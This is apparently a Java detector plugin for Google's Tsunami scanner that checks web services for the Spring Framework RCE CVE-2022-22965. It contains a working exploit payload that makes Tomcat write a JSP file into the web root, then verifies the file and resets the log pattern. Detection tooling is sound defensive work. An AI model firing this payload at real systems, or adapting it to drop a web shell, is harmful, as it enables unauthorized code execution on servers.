/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.spring;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.time.Clock;
import java.time.Instant;
import java.util.Date;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects Spring Framework RCE(CVE-2022-22965)
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "SpringCve202222965Detector",
    version = "0.1",
    description = "This detector checks for Spring Framework RCE(CVE-2022-22965).",
    author = "C4o (syttcasd@gmail.com)",
    bootstrapModule = SpringCve202222965DetectorBootstrapModule.class)
public final class SpringCve202222965Detector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final String FILENAME = "SpringCoreRCEDetect";
  private static final String FORMAT = ".yyyy";
  private static final SimpleDateFormat time_format = new SimpleDateFormat(FORMAT);
  private static final Date time_now = new Date();
  private static final String VERIFY_STRING = "TSUNAMI_SpringCoreRCEDetect";
  private static final String VULNERABILITY_PAYLOAD_STRING = "class.module.classLoader.resources."
      + "context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(%22j%22))%7B%20out."
      + "println(new%20String(%22"+VERIFY_STRING+"%22))%3B%20%7D%25%7Bsuffix%7Di&class.module."
      + "classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader."
      + "resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader."
      + "resources.context.parent.pipeline.first.prefix="+FILENAME+"&class.module.classLoader."
      + "resources.context.parent.pipeline.first.fileDateFormat="+FORMAT;
  private static final String FIX_PAYLOAD_STRING = "class.module.classLoader.resources.context."
      + "parent.pipeline.first.pattern=";
  private static final ByteString VULNERABILITY_PAYLOAD
      = ByteString.copyFromUtf8(VULNERABILITY_PAYLOAD_STRING);
  private static final ByteString FIX_PAYLOAD = ByteString.copyFromUtf8(FIX_PAYLOAD_STRING);

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  SpringCve202222965Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    try {
      HttpResponse postExploitResponse =
          httpClient.send(post(targetUri)
                  .withEmptyHeaders()
                  .setRequestBody(VULNERABILITY_PAYLOAD)
                  .build(),
              networkService
          );
      HttpResponse getExploitResponse =
          httpClient.send(post(targetUri+"?"+VULNERABILITY_PAYLOAD_STRING)
                  .withEmptyHeaders()
                  .build(),
              networkService
          );
      if (postExploitResponse.status() == HttpStatus.OK
          || getExploitResponse.status() == HttpStatus.OK) {
        HttpResponse verifyResponse =
            httpClient.send(get(targetUri+FILENAME+time_format.format(time_now)+".jsp")
                    .withEmptyHeaders()
                    .build(),
                networkService
            );
        if (verifyResponse.status() == HttpStatus.OK
            && verifyResponse.bodyString().toString().contains(VERIFY_STRING)) {
          HttpResponse fixResponse;
          if (postExploitResponse.status() == HttpStatus.OK) {
            fixResponse =
                httpClient.send(post(targetUri)
                        .withEmptyHeaders()
                        .setRequestBody(FIX_PAYLOAD)
                        .build(),
                    networkService
                );
          } else {
            fixResponse =
                httpClient.send(get(targetUri+"?"+FIX_PAYLOAD_STRING)
                        .withEmptyHeaders()
                        .build(),
                    networkService
                );
          }
          if (fixResponse.status() != HttpStatus.OK) {
            logger.atWarning().log("Verified but unable to fix.");
          }
          return true;
        } else {
          logger.atWarning().log("Unable to verify.");
          return false;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE_2022_22965"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Spring Framework RCE CVE-2022-22965")
                .setDescription("A Spring MVC or Spring WebFlux application running on JDK"
                    + " 9+ may be vulnerable to remote code execution (RCE) via data "
                    + "binding. The specific exploit requires the application to run on "
                    + "Tomcat as a WAR deployment. If the application is deployed as a "
                    + "Spring Boot executable jar, i.e. the default, it is not vulnerable "
                    + "to the exploit. However, the nature of the vulnerability is more "
                    + "general, and there may be other ways to exploit it.")
        ).build();
  }
}
